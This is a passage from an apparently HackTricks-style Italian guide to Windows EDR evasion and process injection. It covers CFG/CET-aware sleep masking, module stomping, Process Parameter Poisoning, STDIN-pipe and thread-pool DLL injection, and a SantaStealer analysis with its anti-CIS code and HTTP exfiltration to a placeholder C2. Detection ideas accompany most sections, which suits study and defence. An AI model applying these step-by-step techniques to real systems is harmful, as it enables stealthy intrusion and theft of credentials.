Nei target con CFG abilitato, il primo salto indiretto verso un gadget a metà funzione come `jmp [rbx]` o `jmp rdi` causa in genere il crash del processo con `STATUS_STACK_BUFFER_OVERRUN`, perché il gadget non è presente nei metadati CFG del modulo. Per mantenere attive le catene in stile Ekko/Kraken nei processi protetti:<sup>[[30]](#references)</sup>

- Registra ogni destinazione indiretta usata dalla catena tramite `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e voci `CFG_CALL_TARGET_VALID`.
- Per gli indirizzi all'interno di immagini caricate (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` deve iniziare dalla **base dell'immagine** e coprire **l'intera dimensione dell'immagine**.
- Per regioni mappate manualmente/PIC/stomped, usa invece la **base dell'allocazione** e la dimensione dell'allocazione.
- Contrassegna non solo il gadget di dispatch, ma anche gli export raggiunti indirettamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscall di attesa/evento) e tutte le sezioni eseguibili controllate dall'attaccante che diventeranno target indiretti.

Questo trasforma le catene di sleep in stile ROP/JOP da primitive che "funzionano solo nei processi senza CFG" a primitive riutilizzabili per `explorer.exe`, browser, `svchost.exe` e altri endpoint compilati con `/guard:cf`.

### Stack spoofing compatibile con CET per i thread in attesa

La sostituzione completa di `CONTEXT` è rumorosa e può causare problemi sui sistemi CET Shadow Stack, perché un `Rip` contraffatto deve comunque corrispondere allo shadow stack hardware. Un pattern di sleep-masking più sicuro è:<sup>[[30]](#references)</sup>

- Scegli un altro thread dello stesso processo e leggi i limiti dello stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) tramite `NtQueryInformationThread`.
- Esegui il backup del TEB/TIB reale del thread corrente.
- Acquisisci il contesto reale del thread in attesa con `GetThreadContext`.
- Copia **solo** il `Rip` reale nel contesto contraffatto, lasciando invariato lo stato contraffatto di `Rsp`/stack.
- Durante la finestra di attesa, copia l'`NT_TIB` del thread contraffatto nel TEB corrente, in modo che gli stack walker eseguano l'unwind entro un intervallo di stack legittimo.
- Al termine dell'attesa, ripristina il TIB originale e il contesto del thread.

In questo modo si mantiene un instruction pointer coerente con CET, inducendo però in errore gli stack walker EDR che si fidano dei metadati dello stack nel TEB per convalidare gli unwind.

### Alternativa basata su APC: Kraken Mask

Se il dispatch tramite timer queue ha una firma troppo riconoscibile, la stessa sequenza di sleep-encrypt-spoof-restore può essere eseguita da un thread helper sospeso tramite APC in coda:<sup>[[27]](#references)</sup>

- Crea un thread helper con `NtTestAlert` come entrypoint.
- Metti in coda frame `CONTEXT`/APC preparati con `NtQueueApcThread` e avviali con `NtAlertResumeThread`.
- Memorizza lo stato della catena nell'heap invece che nello stack dell'helper, per evitare di esaurire lo stack predefinito del thread da 64 KB.
- Usa `NtSignalAndWaitForSingleObject` per segnalare atomicamente l'evento di avvio e bloccarti.
- Sospendi il thread principale prima di ripristinare il TIB/contesto (`NtSuspendThread` → ripristino → `NtResumeThread`), riducendo così la finestra di gara in cui uno scanner potrebbe rilevare uno stack ripristinato solo in parte.

Questo sostituisce la firma `CreateTimerQueueTimer` + `NtContinue` con una firma basata su thread helper/APC, mantenendo gli stessi obiettivi di mascheramento RC4 e stack spoofing.

Ulteriori idee per il rilevamento
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco prima di sleep, attese o dispatch APC.
- `GetThreadContext`/`SetThreadContext` usati intorno a `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguito da scritture dirette nei limiti dello stack TEB/TIB del thread corrente.
- Catene `NtQueueApcThread`/`NtAlertResumeThread` che raggiungono indirettamente `SystemFunction032`, `VirtualProtect` o funzioni helper per il ripristino dei permessi delle sezioni.
- Uso ripetuto di firme brevi di gadget come `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) come pivot di dispatch all'interno di moduli firmati.


## Precision Module Stomping

Il module stomping esegue payload dalla **sezione `.text` di una DLL già mappata nel processo target**, invece di allocare memoria eseguibile privata facilmente individuabile o caricare una nuova DLL sacrificale. Il target da sovrascrivere dovrebbe essere un'**immagine caricata e supportata da file su disco**, con uno spazio di codice in grado di contenere il payload senza corrompere i percorsi di codice ancora necessari al processo.<sup>[[1]](#references)[[2]](#references)</sup>

### Selezione affidabile del target

Il module stomping ingenuo contro moduli comuni come `uxtheme.dll` o `comctl32.dll` è fragile: la DLL potrebbe non essere caricata nel processo remoto e una regione di codice troppo piccola potrebbe causare il crash del processo. Un flusso di lavoro più affidabile è:

1. Enumera i moduli del processo target e conserva una **lista di inclusione con i soli nomi** delle DLL già caricate.
2. Crea prima il payload e annota la sua **dimensione esatta in byte**.
3. Scansiona le DLL candidate su disco e confronta la **`Misc_VirtualSize` della sezione PE `.text`** con la dimensione del payload. Questo dato è più importante della dimensione del file, perché riflette la dimensione della sezione eseguibile **quando è mappata in memoria**.
4. Analizza la **Export Address Table (EAT)** e scegli l'RVA di una funzione esportata come offset iniziale per lo stomp.
5. Calcola il **raggio d'impatto**: se il payload supera il limite della funzione selezionata, sovrascriverà gli export adiacenti disposti dopo di essa in memoria.

Strumenti di ricognizione/selezione tipici usati sul campo:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Note operative
- Preferisci le DLL **già caricate** nel processo remoto per evitare la telemetria di `LoadLibrary`/caricamenti imprevisti di immagini.
- Preferisci gli export eseguiti raramente dall'applicazione target; altrimenti, i normali percorsi di esecuzione potrebbero raggiungere i byte sovrascritti prima o dopo la creazione del thread.
- Gli implant di grandi dimensioni richiedono spesso di sostituire l'inserimento dello shellcode come string literal con un **array di byte/inizializzatore tra parentesi graffe**, così che l'intero buffer sia rappresentato correttamente nel codice sorgente dell'injector.

Idee per il rilevamento
- Scritture remote in pagine eseguibili supportate da immagini (`MEM_IMAGE`, `PAGE_EXECUTE*`), anziché nelle più comuni allocazioni private RWX/RX.
- Entry point degli export i cui byte in memoria non corrispondono più al file di origine su disco.
- Thread remoti o context pivot che iniziano l'esecuzione all'interno di un export di una DLL legittima i cui primi byte sono stati modificati di recente.
- Sequenze sospette di `VirtualProtect(Ex)` / `WriteProcessMemory` sulle pagine `.text` delle DLL, seguite dalla creazione di thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) è una tecnica di **process-injection / EDR-evasion** che evita il classico percorso di scrittura remota (`VirtualAllocEx` + `WriteProcessMemory`). Invece di copiare byte in un processo target già in esecuzione, sfrutta il fatto che Windows **copia parametri di avvio selezionati da `CreateProcessW` nel processo figlio** e li memorizza in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Contenitori avvelenabili copiati da `CreateProcessW`

I contenitori utili sono:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vincoli pratici dei contenitori:

- `lpCommandLine` deve puntare a **memoria scrivibile** per `CreateProcessW` e ha un limite di **32,767 caratteri Unicode**, incluso il terminatore null.
- `lpEnvironment` deve essere un blocco di ambiente Unicode composto da stringhe successive `NAME=VALUE\0` e terminato da un ulteriore `\0`.
- `lpReserved` è ufficialmente riservato, quindi la corrispondenza con `ShellInfo` va considerata un dettaglio implementativo, non un contratto documentato stabile.

In questo modo la normale creazione di processi diventa la **primitiva di trasferimento del payload**. L'operatore crea il processo figlio con dati di avvio controllati dall'attaccante e lascia che sia Windows a eseguire la copia tra processi.

### Flusso di ricerca remota senza API di scrittura remota

Dopo la creazione del processo figlio, risolvi il buffer copiato con primitive **di sola lettura**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → ottieni `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leggi il `PEB` remoto
3. Segui `PEB.ProcessParameters`
4. Leggi `RTL_USER_PROCESS_PARAMETERS`
5. Usa il puntatore selezionato:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Flusso minimo:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Esecuzione del buffer dei parametri copiato

La regione dei parametri copiata di solito è `RW`, non eseguibile. Una catena P3 comune è:

1. Creare normalmente il processo (non sospeso)
2. Rendere eseguibile la pagina dei parametri scelta con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Riutilizzare l'handle del thread principale già restituito in `PROCESS_INFORMATION`
4. Reindirizzare l'esecuzione con `NtSetContextThread` (`CONTEXT_CONTROL`, sovrascrivere `RIP`)

A differenza dei workflow classici di thread hijacking, questo **non richiede** `SuspendThread` / `ResumeThread`; il contesto può essere modificato direttamente usando l'handle del thread principale restituito.

Questo evita diverse API comunemente monitorate per l'injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- spesso anche `SuspendThread` / `ResumeThread`

### Limite dei byte nulli e shellcode a stadi

Tutti e tre i carrier sono **dati stringa o simili a stringhe**, quindi un payload grezzo contenente `0x00` viene troncato durante il trasferimento. Una soluzione pratica è un **primo stadio senza byte nulli** che ricostruisce le costanti a runtime e poi carica un secondo stadio arbitrario.

Un semplice schema consiste nella sintesi di costanti basata su XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Questo consente al primo stage di creare stringhe sullo stack, argomenti API, percorsi DLL o un loader shellcode di secondo stage senza incorporare byte nulli nel parametro trasportato.

### Chiamate API basate sullo stack dal primo stage

Quando il primo stage deve chiamare API come `LoadLibraryA`, può:

- inserire la stringa/buffer nello stack del processo di destinazione
- riservare lo **shadow space x64 di 32 byte**
- impostare `RCX`, `RDX`, `R8`, `R9` su costanti o puntatori relativi a `RSP`
- mantenere `RSP` **allineato a 16 byte** prima della chiamata

Un secondo stage può quindi essere copiato dallo stack in un'allocazione `PAGE_READWRITE`, convertita in `PAGE_EXECUTE_READ` con `VirtualProtect`, e infine eseguito con un salto, evitando un'allocazione RWX diretta.

### Idee per il rilevamento

Buone opportunità di hunting menzionate dagli autori:

- `VirtualProtectEx` / `NtProtectVirtualMemory` che rendono eseguibili le **pagine dei parametri del processo**
- questa modifica delle protezioni seguita da `SetThreadContext` / `NtSetContextThread`
- letture remote del `PEB` seguite da letture di `RTL_USER_PROCESS_PARAMETERS`
- valori insolitamente lunghi o ad alta entropia di `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved` durante la creazione del processo

### Note

- P3 è un **metodo di trasferimento tra processi**, non una primitiva di esecuzione completa: il parametro copiato necessita ancora di una modifica dei permessi per l'esecuzione e di un metodo per reindirizzare l'esecuzione.
- `RtlCreateProcessReflection` / Dirty Vanity è stato preso in considerazione dagli autori, ma scartato perché al suo interno ricorre a primitive sospette come `NtWriteVirtualMemory` e `NtCreateThreadEx`.

Per distribuire payload in un processo Windows **esistente** tramite descrizioni dei thread, seguito dal dirottamento dell'indirizzo di ritorno di un thread in attesa, vedere [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Iniezione tramite pipe STDIN della console

È possibile usare anche un processo figlio di una console interattiva come **primitiva di trasferimento del payload**. L'injector reindirizza lo standard input del processo figlio a una pipe e invia un marker seguito dallo shellcode. Dopo che il programma della console ha letto i dati nella propria memoria privata, l'injector individua il buffer, lo rende eseguibile e reindirizza a esso un thread del processo figlio. Questo evita `VirtualAllocEx` e `WriteProcessMemory`, ma si tratta comunque di process injection, non di un bypass EDR generico.<sup>[[41]](#references)</sup>

Nonostante la descrizione «named pipe», l'implementazione di riferimento chiama `CreatePipe`, che crea una **anonymous pipe**. Windows implementa internamente le anonymous pipe tramite oggetti pipe con nomi univoci, ma la PoC non seleziona un percorso `\\.\pipe\<name>` né chiama `CreateNamedPipe`. Crea handle ereditabili con un descrittore di sicurezza predefinito, inserisce l'handle di lettura in `STARTUPINFO.hStdInput`, imposta `STARTF_USESTDHANDLES` e avvia un nuovo processo figlio con l'ereditarietà degli handle abilitata. Pertanto, questa PoC avvia l'eseguibile della console specificato; non collega la pipe a un processo esistente.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Flusso di lavoro di riferimento

L'implementazione usa la seguente catena:<sup>[[41]](#references)</sup>

1. Crea coppie di anonymous pipe per `STDIN` e `STDOUT` del processo figlio. Disabilita l'ereditarietà sui due handle lato processo padre e chiude nel processo padre i duplicati lato processo figlio dopo la creazione del processo.
2. Avvia un eseguibile interattivo come `netsh.exe` o `nslookup.exe` con `CREATE_NEW_CONSOLE`. Il processo figlio eredita gli handle standard reindirizzati.
3. Invia l'intero array binario `rawData` con `WriteFile` tramite l'handle `STDIN` lato processo padre. Il programma della console consuma i byte e ne lascia una copia in una delle proprie regioni private confermate.
4. Esplora lo spazio degli indirizzi del processo figlio con `VirtualQueryEx`, legge le regioni candidate `MEM_PRIVATE` con `ReadProcessMemory` e cerca il marker all'inizio di `rawData`.
5. Modifica il buffer individuato in `PAGE_EXECUTE_READWRITE` con `VirtualProtectEx`.
6. Individua il thread principale, lo sospende, imposta `RIP` su `found_address + 0x19` con `NtSetContextThread` e lo riprende.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

L'implementazione fornita è specifica per x64: modifica `CONTEXT.Rip` e il payload incorporato è shellcode x64. `rawData` inizia con un marker di 25 byte, quindi i byte eseguibili iniziano all'offset esadecimale `0x19`. Quando sostituisci il payload, mantieni questa disposizione oppure aggiorna insieme il marker, il vettore di ricerca, la dimensione dell'array e l'offset di esecuzione. I commenti nel sorgente indicano anche `0x0A`, `0x0D` e `0x1A` come caratteri non ammessi. Questo workflow non modifica il token né i privilegi del processo figlio.<sup>[[41]](#references)</sup>

Per helper nativi di piccole dimensioni e pattern di compilazione dei payload, vedi [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## DLL injection tramite callback del thread pool senza shellcode (DLLParty)

DLLParty adatta la tecnica di injection del thread pool in stile PoolParty per fare in modo che un worker esistente del target chiami `LoadLibraryA`, invece di eseguire uno stub di callback iniettato. La primitiva di dispatch è un completamento `TP_DIRECT` accodato all'I/O completion port del pool del target. Questo non aggira i permessi del processo: il PoC chiama `OpenProcess(PROCESS_ALL_ACCESS)` e richiede memoria del target leggibile/scrivibile e handle worker-factory e completion-port duplicabili.<sup>[[46]](#references)[[47]](#references)</sup>

Su Windows x64, il worker passa in `RCX`, il primo argomento della callback, un puntatore a `TP_CALLBACK_INSTANCE` allocato sullo stack. `LoadLibraryA` interpreta lo stesso puntatore come `LPCSTR`. Nel percorso testato, `TppWorkerThread` crea il puntatore in `RSP+0x178`, mentre la prima scrittura ordinaria in quell'oggetto avviene in `RSP+0x1d0`. Un percorso DLL con terminazione null che rientra in questo prefisso di 0x58 byte può quindi occupare l'inizio dell'istanza senza essere sovrascritto prima del dispatch. Questa è un'osservazione specifica della build, non una garanzia documentata dell'ABI di Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Il workflow di riferimento è:<sup>[[46]](#references)[[47]](#references)</sup>

1. Elenca gli handle del target con `NtQuerySystemInformation(SystemHandleInformation)` e identifica `TpWorkerFactory` interrogando i tipi di oggetto. Duplica un handle worker-factory e interroga `WorkerFactoryBasicInformation`; `StartParameter` fornisce il `TP_POOL` remoto. Salta le factory con `TotalWorkerCount == 0`.
2. Leggi `TP_POOL.CompletionPort` e percorri l'elenco privato dei worker del pool. Nella build x64 testata di Windows 10 19045 (`ntdll.dll 10.0.19041.4842`), la testa si trova in `pool+0x60`; ogni collegamento è in `worker+0x10`, quindi lo slot dell'istanza di callback in `worker+0x38` corrisponde a `link+0x28`. Il PoC controlla l'allineamento dei puntatori, la reciprocità dei collegamenti, l'appartenenza al pool, gli ID thread non nulli, i nodi ripetuti e la stabilità della testa dell'elenco.
3. Scrivi il percorso DLL in **ogni** slot worker individuato, perché il completamento accodato potrebbe essere consumato da qualsiasi worker. Inserisci un `TP_DIRECT` in memoria scrivibile del target, con `Callback = LoadLibraryA`. Il PoC usa `last_slot-0x500` su uno stack worker invece di `VirtualAllocEx`; quell'offset è sperimentale e non deve sovrapporsi a dati attivi dello stack.
4. Duplica l'handle della completion port del target e chiama `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. L'indirizzo remoto di `TP_DIRECT` è la chiave di completamento. Un worker esistente chiama quindi `LoadLibraryA` usando il puntatore dell'istanza di callback sovrascritto, caricando una DLL già accessibile al target.

Il PoC accetta un PID target (`DLLParty.exe <target_pid>`) e usa un percorso DLL hard-coded in `DLLParty.cpp`; imposta un percorso accessibile al target prima di compilare un eseguibile x64. Usa inoltre l'indirizzo di `LoadLibraryA` del proprio processo come callback remota, quindi presuppone che tale indirizzo sia valido nel target. Il codice non controlla che la lunghezza del percorso rientri nel prefisso di 0x58 byte né che la traversata dei worker abbia trovato uno slot prima di indicizzare l'ultimo elemento. Rivalida gli offset privati, la disposizione dello stack e lo spazio scrivibile per la build target. Omettere `CreateRemoteThreadEx`, shellcode e `VirtualAllocEx` non elimina le scritture tra processi né la telemetria del caricamento DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Tecniche di SantaStealer per l'evasione fileless e il furto di credenziali

SantaStealer (noto anche come BluelineStealer) illustra come i moderni info-stealer combinino AV bypass, anti-analysis e accesso alle credenziali in un unico workflow.<sup>[[24]](#references)</sup>

### Filtro basato sul layout di tastiera e ritardo per sandbox

- Un flag di configurazione (`anti_cis`) enumera i layout di tastiera installati tramite `GetKeyboardLayoutList`. Se viene trovato un layout cirillico, il sample crea un marker `CIS` vuoto e termina prima di eseguire gli stealer, assicurandosi di non attivarsi mai nelle aree geografiche escluse e lasciando al contempo un artefatto utile per la ricerca.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logica stratificata di `check_antivm`

- La variante A scorre l’elenco dei processi, calcola un hash per ogni nome usando un checksum rolling personalizzato e lo confronta con blocklist incorporate di debugger/sandbox; ripete il checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- La variante B esamina le proprietà del sistema (soglia minima del numero di processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare le additions di VirtualBox ed esegue controlli temporali attorno alle pause per rilevare lo single-stepping. Qualsiasi rilevamento interrompe l’esecuzione prima dell’avvio dei moduli.

### Helper fileless + caricamento reflective con doppio ChaCha20

- La DLL/EXE principale incorpora un credential helper di Chromium, che viene salvato su disco oppure mappato manualmente in memoria; in modalità fileless, risolve da sé importazioni/rilocazioni, così da non scrivere artefatti dell’helper.
- L’helper conserva una DLL di secondo stadio, cifrata due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambi i passaggi, carica il blob in modo reflective (senza `LoadLibrary`) e chiama gli export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivati da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Le routine di ChromElevator usano il process hollowing reflective con direct syscall per iniettarsi in un browser Chromium attivo, ereditare le chiavi AppBound Encryption e decrittare password/cookie/carte di credito direttamente dai database SQLite, nonostante le protezioni ABE.


### Raccolta modulare in memoria ed esfil HTTP a blocchi

- `create_memory_based_log` scorre una tabella globale di puntatori a funzione `memory_generators` e avvia un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshot, documenti, estensioni del browser ecc.). Ogni thread scrive i risultati in buffer condivisi e comunica il numero di file al termine di una finestra di attesa di circa 45 secondi.
- Al termine, tutto viene compresso con la libreria `miniz` collegata staticamente in `%TEMP%\\Log.zip`. `ThreadPayload1` attende quindi 15 secondi e trasmette l’archivio in blocchi da 10 MB tramite HTTP POST a `http://<C2>:6767/upload`, falsificando un boundary del browser `multipart/form-data` (`----WebKitFormBoundary***`). Ogni blocco aggiunge `User-Agent: upload`, `auth: <build_id>`, un campo opzionale `w: <campaign_tag>` e, nell’ultimo blocco, `complete: true`, così che il C2 sappia che il riassemblaggio è terminato.

## References

- [1] [Tecniche avanzate di evasione: precision module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack: niente più lasciapassare per il malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentazione](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – esempio](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – esempio](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC per lo spoofing del call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuova catena di infezione e offuscamento basato su ConfuserEx per DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Dovresti fidarti del tuo zero trust? Bypass dei controlli di postura di Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Prima di ToolShell: esplorazione delle precedenti operazioni ransomware di Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abuso degli export inoltrati](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventario degli export inoltrati di Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordine di ricerca delle librerie a collegamento dinamico](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Sicurezza dei processi e diritti di accesso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Riferimento EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Launcher CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Contrastare gli EDR con la protezione di Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Abbattere la barriera protettiva di Windows Defender con la tecnica Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Riferimento al comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Sotto la cortina pura: da RAT a builder a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer sta arrivando in città: un nuovo e ambizioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Decrittazione di Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: contrastare il malware Node.js con il tracing delle API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [La bella addormentata: mettere a riposo Adaptix con Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Avvelenamento dei parametri di processo](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [La bella addormentata II: CFG, CET e spoofing dello stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Offuscamento della sospensione Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Nascondere il Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abuso di Chrome Remote Desktop nelle operazioni Red Team: guida pratica](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: trasformare il driver di remediation di Defender in una primitiva per operazioni kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Codice complementare di MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: creazione di funzioni auto-mascheranti con LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Codice sorgente di InjectSetConsole di TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Funzione CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creazione di un processo figlio con input e output reindirizzati](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: riforgiare strumenti C# con WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compilazione di progetti C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Proof-of-concept e codice sorgente di DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — abuso degli internals del thread pool per l’iniezione di DLL senza shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Dataset di benchmark EMBER2024 e strumenti thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Uso di EMBER2024 per valutare gli implant Red Team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Elusione dei rilevamenti basati su machine learning](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – Framework di caricamento .NET basato su XAML NetamLoader](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – Enumerazione AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – Metodo IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - Analisi tecnica di 2CLoader](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
- [55] [Panoramica di tprtdll-Injection e inventario degli export](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/README.md)
- [56] [PoC di self-injection Trusted-twin](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_self.cpp)
- [57] [PoC di cross-process injection Trusted-twin](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_cross.cpp)
{{#include ../banners/hacktricks-training.md}}
